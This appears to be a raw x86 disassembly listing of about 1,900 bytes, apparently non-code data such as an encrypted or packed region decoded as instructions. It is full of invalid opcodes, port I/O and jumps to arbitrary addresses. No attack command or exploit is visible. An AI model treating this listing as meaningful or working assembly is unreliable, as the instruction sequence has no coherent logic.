  426c52:	lock pusha 
  426c54:	pushf  
  426c55:	pusha  
  426c56:	pushf  
  426c57:	cld    
  426c58:	cld    
  426c59:	push   es
  426c5a:	dec    edx
  426c5b:	lock cmp ebp,DWORD PTR [ebx+0x775bb7ee]
  426c62:	loop   0x426c65
  426c64:	add    BYTE PTR [ebx+0x50000003],ch
  426c6a:	test   ah,bh
  426c6c:	scas   eax,DWORD PTR es:[edi]
  426c6d:	mov    BYTE PTR [eax+0x45cfc8b9],dl
  426c73:	sbb    BYTE PTR [esi+0x53d4de12],cl
  426c79:	cwde   
  426c7a:	xchg   edi,eax
  426c7b:	aaa    
  426c7c:	loope  0x426c0d
  426c7e:	out    0xf7,al
  426c80:	cld    
  426c81:	fidivr DWORD PTR [ebp-0x43]
  426c84:	jns    0x426ca5
  426c86:	xchg   DWORD PTR [ebx-0x5c],edi
  426c89:	aad    0x7a
  426c8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c8c:	cmp    esi,DWORD PTR [ecx+0x3d147dbf]
  426c92:	inc    ecx
  426c93:	loope  0x426c9b
  426c95:	sahf   
  426c96:	shr    BYTE PTR [ebp+0x4],1
  426c99:	xchg   ebx,eax
  426c9a:	push   0xffffffec
  426c9c:	sbb    DWORD PTR [edx+0x11fd351f],eax
  426ca2:	inc    eax
  426ca3:	mov    BYTE PTR [eax-0x6f],ah
  426ca6:	and    al,0xa6
  426ca8:	fldcw  WORD PTR [esp+ebp*8]
  426cab:	xor    eax,0x7612e3d0
  426cb0:	sub    BYTE PTR [ecx+0x49],ah
  426cb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cb4:	out    dx,al
  426cb5:	lea    ebp,[esi+0x64b3a26b]
  426cbb:	mov    edx,ebx
  426cbd:	into   
  426cbe:	dec    edx
  426cbf:	mov    esi,0xb7aab4b7
  426cc4:	mov    esp,DWORD PTR [edx+0x14c4b572]
  426cca:	enter  0x636a,0x67
  426cce:	test   eax,0x2f026d63
  426cd3:	repz pop edx
  426cd5:	or     al,0xb1
  426cd7:	push   ecx
  426cd8:	add    al,0x4d
  426cda:	pop    esi
  426cdb:	and    eax,0xf025ca89
  426ce0:	cmp    bh,BYTE PTR [esi-0x3a6dbf7e]
  426ce6:	jmp    0x40e78bef
  426ceb:	pop    es
  426cec:	mov    fs,WORD PTR [esi+0x36]
  426cef:	inc    ecx
  426cf0:	pop    esi
  426cf1:	dec    esi
  426cf2:	(bad)  [ebx]
  426cf4:	out    0x16,eax
  426cf6:	out    0x55,al
  426cf8:	ins    DWORD PTR es:[edi],dx
  426cf9:	dec    eax
  426cfa:	push   ecx
  426cfb:	or     esp,esp
  426cfd:	or     eax,0x5fc0f14c
  426d02:	js     0x426d0a
  426d04:	mov    al,ds:0x5c3c199
  426d09:	pop    esp
  426d0a:	mov    dh,0x4a
  426d0c:	ss (bad) 
  426d0e:	dec    ecx
  426d0f:	mov    ecx,0xad21f090
  426d14:	stc    
  426d15:	mov    ds:0xaf4e8acd,al
  426d1a:	or     eax,0xd74aeb38
  426d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d20:	mov    edx,0x45a69aba
  426d25:	cmp    DWORD PTR [ecx],ecx
  426d27:	pop    edx
  426d28:	stos   DWORD PTR es:[edi],eax
  426d29:	inc    esp
  426d2a:	jo     0x426d24
  426d2c:	enter  0xce96,0xc8
  426d30:	pop    es
  426d31:	xor    ebx,edx
  426d33:	inc    DWORD PTR [ecx*2+0x7cac2f7b]
  426d3a:	ds mov ebp,ecx
  426d3d:	stos   BYTE PTR es:[edi],al
  426d3e:	test   al,0x50
  426d40:	xor    BYTE PTR [eax-0x713ccd00],0xcc
  426d47:	out    0xb1,al
  426d49:	inc    edi
  426d4a:	add    al,0xe2
  426d4c:	inc    edx
  426d4d:	pusha  
  426d4e:	fist   DWORD PTR ds:0x89f0c81a
  426d54:	jns    0x426d9e
  426d56:	xor    edx,DWORD PTR [ebp-0x62]
  426d59:	mov    ch,BYTE PTR [ebx+0x23b316e3]
  426d5f:	dec    ecx
  426d60:	lea    ebx,[eax]
  426d62:	inc    edx
  426d63:	cmp    ebp,DWORD PTR [edi-0x7]
  426d66:	pop    ecx
  426d67:	aam    0x2e
  426d69:	jge    0x426d1c
  426d6b:	retf   
  426d6c:	push   esi
  426d6d:	clc    
  426d6e:	in     al,0x6d
  426d70:	dec    esi
  426d71:	adc    DWORD PTR [bp+0x6f],eax
  426d75:	in     al,dx
  426d76:	pop    ecx
  426d77:	cmp    eax,0xba0840d8
  426d7c:	fnstcw WORD PTR [edi]
  426d7e:	jbe    0x426d4b
  426d80:	ficomp DWORD PTR [ecx-0x4565c8de]
  426d86:	or     bh,BYTE PTR [ecx]
  426d88:	xor    BYTE PTR [edi],bh
  426d8a:	stos   BYTE PTR es:[edi],al
  426d8b:	sbb    edx,DWORD PTR [edx+0x5a]
  426d8e:	push   ebx
  426d8f:	iret   
  426d90:	inc    esp
  426d91:	mov    al,0x78
  426d93:	in     eax,0x40
  426d95:	inc    ecx
  426d96:	ret    
  426d97:	fld    DWORD PTR [edx-0x48]
  426d9a:	mov    esi,0x4350c016
  426d9f:	aad    0x27
  426da1:	xchg   ebp,eax
  426da2:	sbb    esi,DWORD PTR [edx+0x41]
  426da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426da6:	nop
  426da7:	retf   0x96fc
  426daa:	loope  0x426d90
  426dac:	imul   esp,DWORD PTR [esi],0xfffffff9
  426daf:	fwait
  426db0:	aaa    
  426db1:	rol    DWORD PTR [ecx-0x33],0xa1
  426db5:	imul   esp,esp,0x11
  426db8:	fwait
  426db9:	popf   
  426dba:	pop    ds
  426dbb:	fisttp QWORD PTR [esp+edi*8+0x15]
  426dbf:	div    DWORD PTR [ecx-0x50]
  426dc2:	fisub  WORD PTR [ecx]
  426dc4:	add    BYTE PTR [ecx+esi*8-0x30b2bf54],0x5d
  426dcc:	xchg   ecx,eax
  426dcd:	dec    edx
  426dce:	push   edi
  426dcf:	push   es
  426dd0:	xchg   ebp,eax
  426dd1:	mov    ds,WORD PTR [esi]
  426dd3:	sub    eax,0xf6f4df6a
  426dd8:	call   0xc2117499
  426ddd:	stc    
  426dde:	das    
  426ddf:	cmp    edi,ecx
  426de1:	dec    ebp
  426de2:	inc    edx
  426de3:	pop    esp
  426de4:	sbb    eax,0xea11c037
  426de9:	add    DWORD PTR ds:0x634dcc51,eax
  426def:	cmp    BYTE PTR [edi+0x2d],dl
  426df2:	mov    edx,0x61017658
  426df7:	xchg   edx,eax
  426df8:	neg    BYTE PTR [esi-0x64]
  426dfb:	pop    esp
  426dfc:	imul   esi,DWORD PTR [ecx],0xf1465b1b
  426e02:	or     eax,0x62875959
  426e07:	ja     0x426e0d
  426e09:	lahf   
  426e0a:	cld    
  426e0b:	mov    eax,ds:0x29f2a321
  426e10:	mov    ebp,0xe4be68fa
  426e15:	or     esi,DWORD PTR [ecx]
  426e17:	adc    eax,0x6cd74a
  426e1c:	adc    eax,0xf2ae14c1
  426e21:	icebp  
  426e22:	pop    ebp
  426e23:	fdiv   DWORD PTR [esp+ebx*4]
  426e26:	retf   0x9da2
  426e29:	leave  
  426e2a:	scas   al,BYTE PTR es:[edi]
  426e2b:	aas    
  426e2c:	push   eax
  426e2d:	and    cl,bl
  426e2f:	and    al,0x64
  426e31:	inc    ebx
  426e32:	mov    ds:0xfc8339a2,eax
  426e37:	push   edx
  426e38:	mov    dl,0x12
  426e3a:	sub    edi,DWORD PTR [esi]
  426e3c:	push   esi
  426e3d:	pop    ebp
  426e3e:	push   ss
  426e3f:	int    0x2f
  426e41:	cmp    al,BYTE PTR [ebx]
  426e43:	fadd   DWORD PTR [ecx+0x655e5f55]
  426e49:	sub    ebp,DWORD PTR [esp+edi*1-0x32]
  426e4d:	mov    eax,0x693af45e
  426e52:	inc    esp
  426e53:	ins    DWORD PTR es:[edi],dx
  426e54:	adc    al,0x55
  426e56:	aad    0xf5
  426e58:	push   0x11
  426e5a:	lods   eax,DWORD PTR ds:[esi]
  426e5b:	push   edi
  426e5c:	out    0x9c,al
  426e5e:	aam    0x6a
  426e60:	aam    0xf0
  426e62:	adc    eax,0x5f179044
  426e67:	(bad)  
  426e68:	mov    esi,0x803e37ca
  426e6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e6e:	pop    eax
  426e6f:	int    0xd8
  426e71:	stos   BYTE PTR es:[edi],al
  426e72:	push   ecx
  426e73:	xchg   esp,eax
  426e74:	dec    ebp
  426e75:	mov    cl,0xf3
  426e77:	xchg   ecx,eax
  426e78:	mov    edi,0xf214f1d3
  426e7d:	inc    ecx
  426e7e:	bnd jl 0x426e15
  426e81:	pop    ds
  426e82:	into   
  426e83:	stos   DWORD PTR es:[edi],eax
  426e84:	(bad)  
  426e85:	inc    BYTE PTR [esi]
  426e87:	mov    ch,0xea
  426e89:	sahf   
  426e8a:	jae    0x426e70
  426e8c:	pop    es
  426e8d:	jns    0x426e17
  426e8f:	pop    esi
  426e90:	push   es
  426e91:	out    dx,eax
  426e92:	cmp    esi,ecx
  426e94:	push   es
  426e95:	cmp    BYTE PTR [ebp-0x482bc6f3],al
  426e9b:	call   0x88028d24
  426ea0:	mov    eax,DWORD PTR [ebx+0x33]
  426ea3:	mov    ds:0xda35c4bb,al
  426ea8:	xor    BYTE PTR [esi+0x20ba0053],bh
  426eae:	call   0xbfb:0x443b20c4
  426eb5:	or     eax,DWORD PTR [ebp+0x7f588eaa]
  426ebb:	test   ch,bh
  426ebd:	jbe    0x426e63
  426ebf:	pop    ebx
  426ec0:	xchg   edi,eax
  426ec1:	xor    al,0x5
  426ec3:	in     al,0xe0
  426ec5:	fndisi(8087 only) 
  426ec7:	rol    DWORD PTR [ecx+ebp*8+0x69],cl
  426ecb:	add    al,0xd8
  426ecd:	inc    esi
  426ece:	dec    edx
  426ecf:	call   0x251a:0xf38cd069
  426ed6:	and    DWORD PTR [ecx],edi
  426ed8:	les    ecx,FWORD PTR [ecx-0x18d25910]
  426ede:	stos   BYTE PTR es:[edi],al
  426edf:	pusha  
  426ee0:	xchg   eax,esi
  426ee2:	inc    esp
  426ee3:	jg     0x426ee7
  426ee5:	mov    ds:0xb8fa7061,eax
  426eea:	fadd   st,st(4)
  426eec:	scas   eax,DWORD PTR es:[edi]
  426eed:	mov    edx,DWORD PTR [edx+0x12]
  426ef0:	enter  0xe93b,0x4
  426ef4:	push   0xffffffa2
  426ef6:	pop    edx
  426ef7:	inc    ecx
  426ef8:	inc    ebx
  426ef9:	loopne 0x426f30
  426efb:	mov    bl,0xd2
  426efd:	xor    eax,0x8292b023
  426f02:	fcmove st,st(2)
  426f04:	loope  0x426f41
  426f06:	push   ecx
  426f07:	xchg   edi,eax
  426f08:	adc    eax,0xd4e00787
  426f0d:	je     0x426f4d
  426f0f:	lods   eax,DWORD PTR ds:[esi]
  426f10:	pop    esp
  426f11:	adc    al,0x92
  426f13:	or     ebx,ebx
  426f15:	les    esi,FWORD PTR [ecx+0x34]
  426f18:	mov    ebx,0xc0874bdb
  426f1d:	rcr    BYTE PTR [edi+0x22150b8e],1
  426f23:	ja     0x426f13
  426f25:	imul   BYTE PTR ds:0xdef159c9
  426f2b:	lods   al,BYTE PTR ds:[esi]
  426f2c:	test   ebx,eax
  426f2e:	inc    ebx
  426f2f:	out    dx,eax
  426f30:	in     eax,0x8f
  426f32:	mov    ds:0x76037c7c,eax
  426f37:	mov    WORD PTR [ecx],ss
  426f39:	dec    esi
  426f3a:	out    dx,al
  426f3b:	push   edx
  426f3c:	or     BYTE PTR [edx],ch
  426f3e:	sub    BYTE PTR [ebx],bh
  426f40:	mov    esi,0x16c05652
  426f45:	pop    ebp
  426f46:	data16 clc 
  426f48:	loop   0x426ed9
  426f4a:	pusha  
  426f4b:	and    BYTE PTR [ebx+0x64],bl
  426f4e:	push   0x15121623
  426f53:	data16 (bad) 
  426f55:	mov    al,0xab
  426f57:	jo     0x426f5a
  426f59:	pusha  
  426f5a:	outs   dx,BYTE PTR ds:[esi]
  426f5b:	inc    BYTE PTR [edx+0x6]
  426f5e:	jmp    0xfaf9916
  426f63:	or     esi,DWORD PTR ds:0x4b9b0c66
  426f69:	aaa    
  426f6a:	sub    ah,BYTE PTR [ebx-0xd652914]
  426f70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f71:	xchg   ebp,eax
  426f72:	shr    DWORD PTR [esi-0x47b04fe5],0xec
  426f79:	cmp    al,0x4a
  426f7b:	pusha  
  426f7c:	clc    
  426f7d:	inc    esi
  426f7e:	mov    al,0x92
  426f80:	or     eax,ecx
  426f82:	std    
  426f83:	sub    al,0xcb
  426f85:	lods   al,BYTE PTR ds:[esi]
  426f86:	dec    ebp
  426f87:	xor    BYTE PTR [ebx],bh
  426f89:	add    bh,BYTE PTR [ebx-0x41]
  426f8c:	addr16 dec esi
  426f8e:	adc    dl,BYTE PTR es:[edi+ecx*1+0x56]
  426f93:	adc    al,0x9a
  426f95:	jg     0x426f91
  426f97:	mov    DWORD PTR [edx+0x62],esp
  426f9a:	inc    ecx
  426f9b:	scas   eax,DWORD PTR es:[edi]
  426f9c:	sar    BYTE PTR [edx-0x8],cl
  426f9f:	sbb    bl,BYTE PTR [esi*4-0x38a97d7c]
  426fa6:	mov    esi,0x64b32f05
  426fab:	jmp    0xb3d64ba7
  426fb0:	gs xchg ebp,eax
  426fb2:	cli    
  426fb3:	pusha  
  426fb4:	retf   0x6946
  426fb7:	add    DWORD PTR [edx-0x30],esp
  426fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426fbb:	fld    TBYTE PTR [edx-0x338bde2b]
  426fc1:	call   0x161e44c1
  426fc6:	pop    edx
  426fc7:	es xchg esp,ecx
  426fca:	xor    DWORD PTR [esi-0x2d],ecx
  426fcd:	imul   edx,DWORD PTR [eax+ebx*8],0x23fb25c5
  426fd4:	push   eax
  426fd5:	ficomp DWORD PTR [esi]
  426fd7:	hlt    
  426fd8:	sbb    BYTE PTR [edi+edx*2-0x2f],0xb2
  426fdd:	xchg   esi,eax
  426fde:	rcr    BYTE PTR [ebp-0x8faba2e],cl
  426fe4:	xchg   bl,bh
  426fe6:	cld    
  426fe7:	sub    al,0x10
  426fe9:	mov    ecx,0x4a2c5eed
  426fee:	and    al,ch
  426ff0:	xor    DWORD PTR [esi],edx
  426ff2:	push   esi
  426ff3:	jbe    0x427022
  426ff5:	in     al,dx
  426ff6:	bound  ecx,QWORD PTR [esi]
  426ff8:	xor    al,0x9e
  426ffa:	sbb    edi,DWORD PTR [ecx]
  426ffc:	jo     0x42707b
  426ffe:	push   ds
  426fff:	sub    edi,DWORD PTR [ebx+0x732b3978]
  427005:	or     al,0x9d
  427007:	stc    
  427008:	(bad)  ds:[edx+ebp*8]
  42700c:	ins    BYTE PTR es:[edi],dx
  42700d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42700e:	jb     0x426fe6
  427010:	sbb    DWORD PTR [esi+eax*1-0x5e],edx
	...
  427020:	add    BYTE PTR [ebx],bl
  427022:	inc    ebp
  427023:	gs ret 
  427025:	jg     0x42700a
  427027:	mov    edi,0x3db787dd
  42702c:	shr    BYTE PTR [ebp+0x22ea8d24],cl
  427032:	out    0x1,al
  427034:	add    BYTE PTR [ebx+0x66000003],ch
  42703a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42703b:	sub    eax,0x54ebd48a
  427040:	cwde   
  427041:	jg     0x427086
  427043:	mov    ebx,0x3f2fee91
  427048:	cmp    edx,0xeb58a249
  42704e:	xchg   DWORD PTR [ebp+0x6a],esi
  427051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427052:	bound  ebp,QWORD PTR [edi-0x33ee81f8]
  427058:	scas   eax,DWORD PTR es:[edi]
  427059:	dec    ebx
  42705a:	imul   ebp,DWORD PTR [ecx+0x7c00b0d8],0xd09ba1a9
  427064:	mov    ch,0x83
  427066:	addr16 stc 
  427068:	test   eax,0x976c8822
  42706d:	jmp    0x299c856e
  427072:	mov    ah,0x2f
  427074:	clc    
  427075:	xchg   esp,eax
  427076:	ret    
  427077:	repnz lahf 
  427079:	xor    eax,0xfffffff4
  42707c:	jl     0x427045
  42707e:	pop    edi
  42707f:	or     eax,0x2c6d56ba
  427084:	jg     0x4270e7
  427086:	pop    edi
  427087:	push   edi
  427088:	(bad)  
  427089:	fdiv   QWORD PTR [edx+0x149a7a5d]
  42708f:	mov    BYTE PTR [edx-0x40],bh
  427092:	and    al,0x70
  427094:	fadd   DWORD PTR [esi]
  427096:	pop    edx
  427097:	jmp    DWORD PTR [eax]
  427099:	scas   eax,DWORD PTR es:[edi]
  42709a:	mov    dh,BYTE PTR [esi-0x63]
  42709d:	push   esi
  42709e:	inc    eax
  42709f:	sbb    DWORD PTR [ebx+0x2ee2d6be],edi
  4270a5:	pop    ebx
  4270a6:	enter  0xb8ba,0x78
  4270aa:	cmovo  ebp,DWORD PTR [ebp+0x45d554]
  4270b1:	xor    BYTE PTR [edx+0x293e6f83],bh
  4270b7:	ret    
  4270b8:	fnstsw WORD PTR [edi+0x46]
  4270bb:	mov    edi,0x3f0e0d8e
  4270c0:	xlat   BYTE PTR ds:[ebx]
  4270c1:	in     al,dx
  4270c2:	adc    eax,0xac189644
  4270c7:	in     eax,dx
  4270c8:	imul   ebx,eax,0x76
  4270cb:	scas   eax,DWORD PTR es:[edi]
  4270cc:	js     0x427127
  4270ce:	pop    edx
  4270cf:	mov    ds:0xd26b832c,eax
  4270d4:	(bad)  
  4270d6:	(bad)  
  4270d7:	mov    eax,0xd06a59b7
  4270dc:	xlat   BYTE PTR ds:[ebx]
  4270dd:	fld    st(0)
  4270df:	inc    ebx
  4270e0:	sub    esp,0xffffffc4
  4270e3:	int    0xe9
  4270e5:	sub    al,0xfa
  4270e7:	in     eax,0x3e
  4270e9:	rcl    esp,1
  4270eb:	push   edi
  4270ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270ed:	imul   edx,DWORD PTR [esi],0x3b
  4270f0:	dec    edx
  4270f1:	les    ebx,FWORD PTR [edi+0x70]
  4270f4:	stc    
  4270f5:	dec    edi
  4270f6:	pusha  
  4270f7:	out    dx,eax
  4270f8:	fcmovnbe st,st(2)
  4270fa:	fcomp  QWORD PTR [ebp+0x41]
  4270fd:	and    bh,BYTE PTR [esi-0x33]
  427100:	or     dl,bl
  427102:	aas    
  427103:	push   ss
  427104:	arpl   WORD PTR [ebx],dx
  427106:	cld    
  427107:	xchg   esi,eax
  427108:	push   esi
  427109:	mov    eax,ds:0xe5adddcd
  42710e:	push   ds
  42710f:	mov    ebx,0x449a7bdc
  427114:	loope  0x4270f9
  427116:	sbb    eax,0x30bd6b58
  42711b:	xor    edi,DWORD PTR [ecx+0x4d]
  42711e:	cdq    
  42711f:	retf   
  427120:	and    DWORD PTR [edi-0x4c5cd32c],0xe788ebe
  42712a:	dec    eax
  42712b:	mov    edi,ecx
  42712d:	mov    esp,0xd7ed66c9
  427132:	in     al,0xed
  427134:	leave  
  427135:	in     al,0xbf
  427137:	or     al,0x7
  427139:	clc    
  42713a:	ficom  WORD PTR [edx-0x4f65da77]
  427140:	sbb    BYTE PTR [esi],dl
  427142:	inc    edx
  427143:	xchg   ebp,eax
  427144:	mov    eax,ds:0x41326d58
  427149:	rcr    DWORD PTR [edx+0x3],0x55
  42714d:	xor    BYTE PTR [ebp-0x4389e195],ah
  427153:	cmp    eax,0xfd5bfa42
  427158:	mov    bh,0x41
  42715a:	mov    bl,BYTE PTR [esi-0x4ff26e3d]
  427160:	add    BYTE PTR ds:[ecx+0x2373a952],dh
  427167:	aam    0xcb
  427169:	pop    esp
  42716a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42716b:	out    0xff,eax
  42716d:	out    0x6c,eax
  42716f:	sbb    al,0x11
  427171:	mov    bl,0x5e
  427173:	aaa    
  427174:	das    
  427175:	out    dx,eax
  427176:	aam    0xf8
  427178:	iret   
  427179:	cli    
  42717a:	lock adc al,0x9c
  42717d:	pop    ecx
  42717e:	addr16 mov dl,0xc3
  427181:	ror    DWORD PTR [ecx+esi*4+0x59],0x3e
  427186:	mov    ebp,edi
  427188:	xor    al,0xc
  42718a:	cmc    
  42718b:	inc    DWORD PTR [ebp-0xd]
  42718e:	(bad)  
  42718f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427190:	dec    ebx
  427191:	loope  0x4271fa
  427193:	sub    bh,0xa2
  427196:	or     eax,0xde904511
  42719b:	or     BYTE PTR [edx+0x47],ch
  42719e:	xlat   BYTE PTR ds:[ebx]
  42719f:	pop    eax
  4271a0:	jae    0x4271c1
  4271a2:	mov    ds:0x13545686,eax
  4271a7:	xlat   BYTE PTR ds:[ebx]
  4271a8:	dec    edx
  4271a9:	dec    ebx
  4271aa:	xlat   BYTE PTR ds:[ebx]
  4271ab:	ret    0x8058
  4271ae:	lds    esi,FWORD PTR [ebx+0x5c]
  4271b1:	lods   al,BYTE PTR ds:[esi]
  4271b2:	xchg   DWORD PTR [eax-0x40504078],eax
  4271b8:	cwde   
  4271b9:	scas   eax,DWORD PTR es:[edi]
  4271ba:	add    ch,ah
  4271bc:	xchg   edx,eax
  4271bd:	lods   al,BYTE PTR ds:[esi]
  4271be:	adc    eax,0x8e038fb5
  4271c3:	pushf  
  4271c4:	(bad)  
  4271c5:	mov    ah,0x80
  4271c7:	cmp    dl,BYTE PTR [edi+ebx*1+0x1dae77b8]
  4271ce:	xchg   ecx,eax
  4271cf:	les    ecx,FWORD PTR [ebx]
  4271d1:	repnz pop esi
  4271d3:	push   esi
  4271d4:	retf   0x5e97
  4271d7:	pusha  
  4271d8:	pop    ss
  4271d9:	cli    
  4271da:	loopne 0x4271b2
  4271dc:	jmp    0x76d3:0xb2df0155
  4271e3:	mov    ?,WORD PTR [ecx-0x127668b8]
  4271e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271ea:	pop    esi
  4271eb:	pushf  
  4271ec:	jle    0x427221
  4271ee:	pusha  
  4271ef:	addr16 push ss
  4271f1:	fld    QWORD PTR ds:0x105fbed6
  4271f7:	enter  0xaa6a,0x6e
  4271fb:	data16 sbb BYTE PTR [edx-0x63308097],dh
  427202:	xchg   BYTE PTR [edx+0x6c],cl
  427205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427206:	pop    eax
  427207:	mov    eax,ds:0x72cbcf63
  42720c:	sbb    BYTE PTR [ebx-0x5b0654eb],bl
  427212:	cmp    esi,DWORD PTR [ebx]
  427214:	jp     0x427213
  427216:	dec    esp
  427217:	add    al,0x70
  427219:	add    al,0xee
  42721b:	mov    BYTE PTR [edi],bh
  42721d:	popf   
  42721e:	jo     0x4271d3
  427220:	mov    edi,0x68110ee3
  427225:	xchg   edi,eax
  427226:	outs   dx,DWORD PTR ds:[esi]
  427227:	test   al,0x65
  427229:	mov    al,ds:0xcd89c3c7
  42722e:	sub    edi,DWORD PTR [eax+0x57]
  427231:	sbb    ch,BYTE PTR [ebp+0x59]
  427234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427235:	loopne 0x427254
  427237:	jl     0x427267
  427239:	scas   eax,DWORD PTR es:[edi]
  42723a:	nop
  42723b:	sub    dh,bh
  42723d:	and    edx,DWORD PTR [edi+0x34944634]
  427243:	dec    ecx
  427244:	inc    eax
  427245:	lahf   
  427246:	inc    ebp
  427247:	adc    dh,BYTE PTR [ebp-0x1a]
  42724a:	fxtract 
  42724c:	dec    edx
  42724d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42724e:	sahf   
  42724f:	jmp    0x42723b
  427251:	popf   
  427252:	jnp    0x4272c2
  427254:	xchg   esi,eax
  427255:	inc    edx
  427256:	aaa    
  427257:	mov    dl,0x1c
  427259:	adc    BYTE PTR [ebp+0x26],cl
  42725c:	pop    es
  42725d:	je     0x4271f9
  42725f:	aas    
  427260:	dec    edi
  427261:	pop    ebx
  427262:	mov    ch,0x62
  427264:	and    edx,esi
  427266:	xchg   ecx,eax
  427267:	hlt    
  427268:	mov    ?,WORD PTR [ebp-0x4075435d]
  42726e:	dec    eax
  42726f:	xchg   ebp,eax
  427270:	dec    ebp
  427271:	mov    ds:0x54d00879,eax
  427276:	outs   dx,BYTE PTR ds:[esi]
  427277:	jo     0x42726d
  427279:	hlt    
  42727a:	fnstcw WORD PTR fs:[esi-0x62]
  42727e:	lock outs dx,BYTE PTR ds:[esi]
  427280:	ror    ebp,cl
  427282:	mov    bl,0x5c
  427284:	dec    esp
  427285:	popf   
  427286:	rcr    ecx,0xf4
  427289:	jbe    0x427252
  42728b:	xchg   edx,eax
  42728c:	push   ebx
  42728d:	jbe    0x42723b
  42728f:	scas   eax,DWORD PTR es:[edi]
  427290:	and    BYTE PTR [esi+0x76],al
  427293:	sub    edi,DWORD PTR [edx-0x6c]
  427296:	jnp    0x4272c1
  427298:	pop    ebx
  427299:	sahf   
  42729a:	push   esp
  42729b:	mov    ecx,0x3cd941ca
  4272a0:	fmul   QWORD PTR [ecx+0x50]
  4272a3:	sbb    eax,0x11a5ad9e
  4272a8:	pusha  
  4272a9:	jl     0x4272a7
  4272ab:	shr    BYTE PTR [edi+0x2cd1d22],cl
  4272b1:	mov    DWORD PTR [eax+esi*4+0x4d],edx
  4272b5:	outs   dx,BYTE PTR ds:[esi]
  4272b6:	jl     0x4272c9
  4272b8:	mov    esi,0x6edb7f57
  4272bd:	mov    al,ds:0xf00b066f
  4272c2:	mov    al,0x16
  4272c4:	pushf  
  4272c5:	dec    ebx
  4272c6:	mov    ebx,0x98910c7d
  4272cb:	repnz xor al,0xf7
  4272ce:	push   esi
  4272cf:	pop    ebp
  4272d0:	dec    esi
  4272d1:	mov    ah,0x3b
  4272d3:	and    DWORD PTR [edi],ebx
  4272d5:	sub    al,0x74
  4272d7:	dec    ecx
  4272d8:	test   DWORD PTR [eax+0x198aae15],edi
  4272de:	inc    ecx
  4272df:	sbb    BYTE PTR [eax],0x9f
  4272e2:	add    edx,DWORD PTR [ebx]
  4272e4:	sti    
  4272e5:	aaa    
  4272e6:	(bad)  
  4272e7:	pop    edi
  4272e8:	(bad)  
  4272e9:	dec    edx
  4272ea:	mov    DWORD PTR [ecx-0x5a],eax
  4272ed:	addr16 cdq 
  4272ef:	push   esp
  4272f0:	pop    edx
  4272f1:	xchg   ecx,eax
  4272f2:	jle    0x4272a0
  4272f4:	or     al,0xc0
  4272f6:	pushf  
  4272f7:	sub    cl,BYTE PTR [ecx+0x5f]
  4272fa:	sahf   
  4272fb:	fwait
  4272fc:	pop    eax
  4272fd:	daa    
  4272fe:	inc    eax
  4272ff:	push   0x46683421
  427304:	sub    DWORD PTR [ecx-0x1cde337a],ecx
  42730a:	mov    ah,BYTE PTR ds:0x70c13442
  427310:	lock bound esi,QWORD PTR [eax-0x1f]
  427314:	fsubr  st(7),st
  427316:	push   ebp
  427317:	in     al,0x47
  427319:	mov    eax,ds:0x2e30bde4
  42731e:	loop   0x42738d
  427320:	stos   DWORD PTR es:[edi],eax
  427321:	sbb    dl,ah
  427323:	xchg   edi,eax
  427324:	push   edi
  427325:	mov    ah,0x1d
  427327:	xchg   esi,eax
  427328:	add    DWORD PTR [ebx+edx*8+0x4c],edi
  42732c:	cmp    BYTE PTR [edx],dh
  42732e:	(bad)  
  42732f:	leave  
  427330:	sub    eax,0x796f9128
  427335:	push   ss
  427336:	fdivp  st(7),st
  427338:	idiv   DWORD PTR [ebx]
  42733a:	sub    BYTE PTR [eax],0x10
  42733d:	call   0x6cccd7cd
  427342:	jnp    0x427395
  427344:	inc    ebx
  427345:	test   DWORD PTR [ecx+eiz*2-0x7a],ebx
  427349:	xchg   esi,eax
  42734a:	push   ss
  42734b:	mov    dl,0xad
  42734d:	call   DWORD PTR [eax-0x7445ecc8]
  427353:	sbb    ebx,DWORD PTR ds:0x4b9afc41
  427359:	push   es
  42735a:	push   esp
  42735b:	fst    QWORD PTR [edx+ecx*1-0x463f8491]
  427362:	mov    ds:0xd5071cf0,al
  427367:	or     BYTE PTR [edi-0x2d],ch
  42736a:	cwde   
  42736b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42736c:	sub    al,0xf5
  42736e:	sar    bh,0xc5
  427371:	jb     0x427363
  427373:	sub    BYTE PTR gs:[edx-0x532ac466],0x1
  42737b:	nop
  42737c:	or     al,0x93
  42737e:	cmp    ebx,DWORD PTR [ecx-0x7]
  427381:	adc    ah,BYTE PTR [ebp+0x72501c8b]
  427387:	cmp    BYTE PTR [ecx],ah
  427389:	cmp    esi,esp
  42738b:	pop    es
  42738c:	retf   0xee5a
  42738f:	fcmovbe st,st(5)
  427391:	xchg   esp,eax
  427392:	and    edi,esp
  427394:	scas   eax,DWORD PTR es:[edi]
  427395:	jecxz  0x4273fb
  427397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427398:	fs xor eax,0x92106953
  42739e:	or     DWORD PTR [ebx+0x68],0x8e6609f9
  4273a5:	loop   0x4273b8
  4273a7:	dec    ebx
  4273a8:	mov    edx,0x92d6ef5f
  4273ad:	or     bl,BYTE PTR [esi]
  4273af:	cmc    
  4273b0:	out    0xa9,eax
  4273b2:	dec    edi
  4273b3:	and    edi,DWORD PTR [ebx+0x6d]
  4273b6:	add    BYTE PTR [ecx-0x1aff032d],ch
  4273bc:	cmp    al,0xb1
  4273be:	mov    bl,0x72
  4273c0:	jb     0x42737c
  4273c2:	fnsave [esi]
  4273c4:	lods   eax,DWORD PTR ds:[esi]
  4273c5:	mov    ebx,0x236c878
  4273ca:	ret    
  4273cb:	retf   
